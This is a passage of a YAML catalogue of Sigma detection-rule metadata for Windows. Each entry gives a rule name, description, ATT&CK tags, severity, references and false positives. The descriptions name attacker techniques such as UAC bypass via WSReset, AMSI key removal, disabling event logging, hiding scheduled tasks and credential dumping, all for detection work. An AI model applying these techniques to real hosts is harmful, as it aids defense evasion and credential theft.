  - http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
  false_positives:
  - Windows installed on non-C drive
  notes: ''
- detection_id: 53d4bb30-3f36-4e8a-b078-69d36c4a79ff
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_xwizard_runwizard_com_object_exec.yml
  name: COM Object Execution via Xwizard.EXE
  description: 'Detects the execution of Xwizard tool with the "RunWizard" flag and
    a GUID like argument.

    This utility can be abused in order to run custom COM object created in the registry.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Xwizard/
  - https://www.elastic.co/guide/en/security/current/execution-of-com-object-via-xwizard.html
  - https://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c4b890e5-8d8c-4496-8c66-c805753817cd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_tampering/proc_tampering_susp_process_hollowing.yml
  name: Potential Process Hollowing Activity
  description: Detects when a memory process image does not match the disk image,
    indicative of process hollowing.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_tampering
  data_sources: []
  tactics: []
  techniques:
  - T1055.012
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055.012
  time_window: ''
  references:
  - https://twitter.com/SecurePeacock/status/1486054048390332423?s=20
  - https://www.bleepingcomputer.com/news/microsoft/microsoft-sysmon-now-detects-malware-process-tampering-attempts/
  false_positives:
  - Unknown
  notes: ''
- detection_id: db809f10-56ce-4420-8c86-d6a7d793c79c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/raw_access_thread/raw_access_thread_susp_disk_access_using_uncommon_tools.yml
  name: Potential Defense Evasion Via Raw Disk Access By Uncommon Tools
  description: Detects raw disk access using uncommon tools or tools that are located
    in suspicious locations (heavy filtering is required), which could indicate possible
    defense evasion attempts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: raw_access_thread
  data_sources: []
  tactics: []
  techniques:
  - T1006
  tags:
  - attack.defense-evasion
  - attack.t1006
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  false_positives:
  - Likely
  notes: ''
- detection_id: d4f4e0be-cf12-439f-9e25-4e2cdcf7df5a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_add/registry_add_persistence_disk_cleanup_handler_entry.yml
  name: Potential Persistence Via Disk Cleanup Handler - Registry
  description: 'Detects when an attacker modifies values of the Disk Cleanup Handler
    in the registry to achieve persistence.

    The disk cleanup manager is part of the operating system. It displays the dialog
    box []

    The user has the option of enabling or disabling individual handlers by selecting
    or clearing their check box in the disk cleanup manager''s UI.

    Although Windows comes with a number of disk cleanup handlers, they aren''t designed
    to handle files produced by other applications.

    Instead, the disk cleanup manager is designed to be flexible and extensible by
    enabling any developer to implement and register their own disk cleanup handler.

    Any developer can extend the available disk cleanup services by implementing and
    registering a disk cleanup handler.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_add
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://persistence-info.github.io/Data/diskcleanuphandler.html
  - https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/
  false_positives:
  - Legitimate new entry added by windows
  notes: ''
- detection_id: 72a0369a-2576-4aaf-bfc9-6bb24a574ac6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_delete/registry_delete_defender_context_menu.yml
  name: Delete Defender Scan ShellEx Context Menu Registry Key
  description: Detects deletion of registry key that adds 'Scan with Defender' option
    in context menu. Attackers may use this to make it harder for users to scan files
    that are suspicious.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: registry_delete
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://research.splunk.com/endpoint/395ed5fe-ad13-4366-9405-a228427bdd91/
  - https://winaero.com/how-to-delete-scan-with-windows-defender-from-context-menu-in-windows-10/
  - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/
  - https://blog.malwarebytes.com/malwarebytes-news/2021/02/lazyscripter-from-empire-to-double-rat/
  false_positives:
  - Unlikely as this weakens defenses and normally would not be done even if using
    another AV.
  notes: ''
- detection_id: 5dfc1465-8f65-4fde-8eb5-6194380c6a62
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_delete/registry_delete_enable_windows_recall.yml
  name: Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted
  description: 'Detects the enabling of the Windows Recall feature via registry manipulation.
    Windows Recall can be enabled by deleting the existing "DisableAIDataAnalysis"
    registry value.

    Adversaries may enable Windows Recall as part of post-exploitation discovery and
    collection activities.

    This rule assumes that Recall is already explicitly disabled on the host, and
    subsequently enabled by the adversary.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_delete
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1113
  tags:
  - attack.collection
  - attack.t1113
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/client-management/manage-recall
  - https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-windowsai#disableaidataanalysis
  false_positives:
  - Legitimate use/activation of Windows Recall
  notes: ''
- detection_id: 272e55a4-9e6b-4211-acb6-78f51f0b1b40
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_delete/registry_delete_exploit_guard_protected_folders.yml
  name: Folder Removed From Exploit Guard ProtectedFolders List - Registry
  description: Detects the removal of folders from the "ProtectedFolders" list of
    of exploit guard. This could indicate an attacker trying to launch an encryption
    process or trying to manipulate data inside of the protected folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_delete
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/
  false_positives:
  - Legitimate administrators removing applications (should always be investigated)
  notes: ''
- detection_id: 07bdd2f5-9c58-4f38-aec8-e101bb79ef8d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_delete/registry_delete_mstsc_history_cleared.yml
  name: Terminal Server Client Connection History Cleared - Registry
  description: Detects the deletion of registry keys containing the MSTSC connection
    history
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_delete
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1070
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1070
  - attack.t1112
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer
  - http://woshub.com/how-to-clear-rdp-connections-history/
  - https://www.trendmicro.com/en_us/research/23/a/vice-society-ransomware-group-targets-manufacturing-companies.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 41d1058a-aea7-4952-9293-29eaaf516465
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_delete/registry_delete_removal_amsi_registry_key.yml
  name: Removal Of AMSI Provider Registry Keys
  description: Detects the deletion of AMSI provider registry key entries in HKLM\Software\Microsoft\AMSI.
    This technique could be used by an attacker in order to disable AMSI inspection.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_delete
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://seclists.org/fulldisclosure/2020/Mar/45
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 96f697b0-b499-4e5d-9908-a67bec11cdb6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_delete/registry_delete_removal_com_hijacking_registry_key.yml
  name: Removal of Potential COM Hijacking Registry Keys
  description: 'Detects any deletion of entries in ".*\shell\open\command" registry
    keys.

    These registry keys might have been used for COM hijacking activities by a threat
    actor or an attacker and the deletion could indicate steps to remove its tracks.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_delete
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/7
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/3.C.1_22A46621-7A92-48C1-81BF-B3937EB4FDC3.md
  - https://learn.microsoft.com/en-us/windows/win32/shell/launch
  - https://learn.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iexecutecommand
  - https://learn.microsoft.com/en-us/windows/win32/shell/shell-and-managed-code
  false_positives:
  - Legitimate software (un)installations are known to cause false positives. Please
    add them as a filter when encountered
  notes: ''
- detection_id: 3a9b8c1e-5b2e-4f7a-9d1c-2a7f3b6e1c55
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_delete/registry_delete_runmru.yml
  name: RunMRU Registry Key Deletion - Registry
  description: 'Detects attempts to delete the RunMRU registry key, which stores the
    history of commands executed via the run dialog.

    In the clickfix techniques, the phishing lures instruct users to open a run dialog
    through (Win + R) and execute malicious commands.

    Adversaries may delete this key to cover their tracks after executing commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: registry_delete
  data_sources: []
  tactics: []
  techniques:
  - T1070.003
  tags:
  - attack.defense-evasion
  - attack.t1070.003
  time_window: ''
  references:
  - https://www.zscaler.com/blogs/security-research/coldriver-updates-arsenal-baitswitch-and-simplefix
  false_positives:
  - Unknown
  notes: ''
- detection_id: 526cc8bc-1cdc-48ad-8b26-f19bff969cec
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_index_value_removal.yml
  name: Removal Of Index Value to Hide Schedule Task - Registry
  description: Detects when the "index" value of a scheduled task is removed or deleted
    from the registry. Which effectively hides it from any tooling such as "schtasks
    /query"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_delete
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments
  false_positives:
  - Unknown
  notes: ''
- detection_id: acd74772-5f88-45c7-956b-6a7b36c294d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_sd_value_removal.yml
  name: Removal Of SD Value to Hide Schedule Task - Registry
  description: Remove SD (Security Descriptor) value in \Schedule\TaskCache\Tree registry
    hive to hide schedule task. This technique is used by Tarrask malware
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_delete
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 460479f3-80b7-42da-9c43-2cc1d54dbccd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_add_local_hidden_user.yml
  name: Creation of a Local Hidden User Account by Registry
  description: Sysmon registry detection of a local hidden user account.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  tags:
  - attack.persistence
  - attack.t1136.001
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1387530414185664538
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6ea3bf32-9680-422d-9f50-e90716b12a66
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_bypass_via_wsreset.yml
  name: UAC Bypass Via Wsreset
  description: Unfixed method for UAC bypass from Windows 10. WSReset.exe file associated
    with the Windows Store. It will run a binary file contained in a low-privilege
    registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/trickbot-uses-a-new-windows-10-uac-bypass-to-launch-quietly
  - https://lolbas-project.github.io/lolbas/Binaries/Wsreset
  false_positives:
  - Unknown
  notes: ''
- detection_id: b6d235fc-1d38-4b12-adbe-325f06728f37
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_cmstp_execution_by_registry.yml
  name: CMSTP Execution Registry Event
  description: Detects various indicators of Microsoft Connection Manager Profile
    Installer execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.003
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218.003
  - attack.g0069
  - car.2019-04-001
  time_window: ''
  references:
  - https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/
  false_positives:
  - Legitimate CMSTP use (unlikely in modern enterprise environments)
  notes: ''
- detection_id: 5a9e1b2c-8f7d-4a1e-9b3c-0f6d7e5a4b1f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_defender_threat_action_modified.yml
  name: Windows Defender Threat Severity Default Action Modified
  description: 'Detects modifications or creations of Windows Defender''s default
    threat action settings based on severity to ''allow'' or take ''no action''.

    This is a highly suspicious configuration change that effectively disables Defender''s
    ability to automatically mitigate threats of a certain severity level,

    allowing malicious software to run unimpeded. An attacker might use this technique
    to bypass defenses before executing payloads.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference
  - https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/security-malware-windows-defender-threatseveritydefaultaction
  - https://research.splunk.com/endpoint/7215831c-8252-4ae3-8d43-db588e82f952
  - https://gist.github.com/Dump-GUY/8daef859f382b895ac6fd0cf094555d2
  - https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/
  false_positives:
  - Legitimate administration via scripts or tools (e.g., SCCM, Intune, GPO enforcement).
    Correlate with administrative activity.
  - Software installations that legitimately modify Defender settings (less common
    for these specific keys).
  notes: ''
- detection_id: 919f2ef0-be2d-4a7a-b635-eb2b41fde044
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_disable_security_events_logging_adding_reg_key_minint.yml
  name: Disable Security Events Logging Adding Reg Key MiniNt
  description: Detects the addition of a key 'MiniNt' to the registry. Upon a reboot,
    Windows Event Log service will stop writing events.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1562.002
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1562.002
  - attack.t1112
  - car.2022-03-001
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1182516740955226112
  - https://www.hackingarticles.in/defense-evasion-windows-event-logging-t1562-002/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1a2d6c47-75b0-45bd-b133-2c0be75349fd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_disable_wdigest_credential_guard.yml
  name: Wdigest CredGuard Registry Modification
  description: 'Detects potential malicious modification of the property value of
    IsCredGuardEnabled from

    HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest to disable Cred
    Guard on a system.

    This is usually used with UseLogonCredential to manipulate the caching credentials.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://teamhydra.blog/2020/08/25/bypassing-credential-guard/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5aad0995-46ab-41bd-a9ff-724f41114971
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_esentutl_volume_shadow_copy_service_keys.yml
  name: Esentutl Volume Shadow Copy Service Keys
  description: Detects the volume shadow copy service initialization and processing
    via esentutl. Registry keys such as HKLM\\System\\CurrentControlSet\\Services\\VSS\\Diag\\VolSnap\\Volume
    are captured.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  tags:
  - attack.credential-access
  - attack.t1003.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy
  false_positives:
  - Unknown
  notes: ''
- detection_id: a6b33c02-8305-488f-8585-03cb2a7763f2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_hack_wce_reg.yml
  name: Windows Credential Editor Registry
  description: Detects the use of Windows Credential Editor (WCE)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - attack.s0005
  time_window: ''
  references:
  - https://www.ampliasecurity.com/research/windows-credentials-editor/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ac8866c7-ce44-46fd-8c17-b24acff96ca8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_hybridconnectionmgr_svc_installation.yml
  name: HybridConnectionManager Service Installation - Registry
  description: Detects the installation of the Azure Hybrid Connection Manager service
    to allow remote code execution from Azure function.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics: []
  techniques:
  - T1608
  tags:
  - attack.resource-development
  - attack.t1608
  time_window: ''
  references:
  - https://twitter.com/Cyb3rWard0g/status/1381642789369286662
  false_positives:
  - Unknown
  notes: ''
- detection_id: f7f9ab88-7557-4a69-b30e-0a8f91b3a0e7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_mal_azorult.yml
  name: Registry Entries For Azorult Malware
  description: Detects the presence of a registry key created during Azorult execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.execution
  - attack.t1112
  time_window: ''
  references:
  - https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojan.win32.azoruit.a
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1c8e96cd-2bed-487d-9de0-b46c90cade56
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_malware_qakbot_registry.yml
  name: Potential Qakbot Registry Activity
  description: Detects a registry key used by IceID in a campaign that distributes
    malicious OneNote files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution
  false_positives:
  - Unknown
  notes: ''
- detection_id: 67a6c006-3fbe-46a7-9074-2ba3b82c3000
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_modify_screensaver_binary_path.yml
  name: Path To Screensaver Binary Modified
  description: Detects value modification of registry key containing path to binary
    used as screensaver.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.002
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.002/T1546.002.md
  - https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf
  false_positives:
  - Legitimate modification of screensaver
  notes: ''
- detection_id: f663a6d9-9d1b-49b8-b2b1-0637914d199a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_narrator_feedback_persistance.yml
  name: Narrator's Feedback-Hub Persistence
  description: Detects abusing Windows 10 Narrator's Feedback-Hub
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: d67572a0-e2ec-45d6-b8db-c100d14b8ef2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_net_ntlm_downgrade.yml
  name: NetNTLM Downgrade Attack - Registry
  description: Detects NetNTLM downgrade attack
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1562.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1562.001
  - attack.t1112
  time_window: ''
  references:
  - https://web.archive.org/web/20171113231705/https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks
  - https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=NSrpcservers
  false_positives:
  - Services or tools that set the values to more restrictive values
  notes: ''
- detection_id: 6aa1d992-5925-4e9f-a49b-845e51d1de01
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_new_dll_added_to_appcertdlls_registry_key.yml
  name: New DLL Added to AppCertDlls Registry Key
  description: 'Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs
    value in the Registry key can be abused to obtain persistence and privilege escalation

    by causing a malicious DLL to be loaded and run in the context of separate processes
    on the computer.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.009
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.009
  time_window: ''
  references:
  - http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/
  - https://eqllib.readthedocs.io/en/latest/analytics/14f90406-10a0-4d36-a672-31cabe149f2f.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4f84b697-c9ed-4420-8ab5-e09af5b2345d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_new_dll_added_to_appinit_dlls_registry_key.yml
  name: New DLL Added to AppInit_DLLs Registry Key
  description: DLLs that are specified in the AppInit_DLLs value in the Registry key
    HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows are loaded by user32.dll
    into every process that loads user32.dll
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.010
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.010
  time_window: ''
  references:
  - https://eqllib.readthedocs.io/en/latest/analytics/822dc4c5-b355-4df8-bd37-29c458997b8f.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3d27f6dd-1c74-4687-b4fa-ca849d128d1c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_office_test_regadd.yml
  name: Office Application Startup - Office Test
  description: Detects the addition of office test registry that allows a user to
    specify an arbitrary DLL that will be executed every time an Office application
    is started
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1137.002
  tags:
  - attack.persistence
  - attack.t1137.002
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 295a59c1-7b79-4b47-a930-df12c15fc9c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_event/registry_event_office_trust_record_modification.yml
  name: Windows Registry Trust Record Modification
  description: Alerts on trust record modification within the registry, indicating
    usage of macros
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics: []
  techniques:
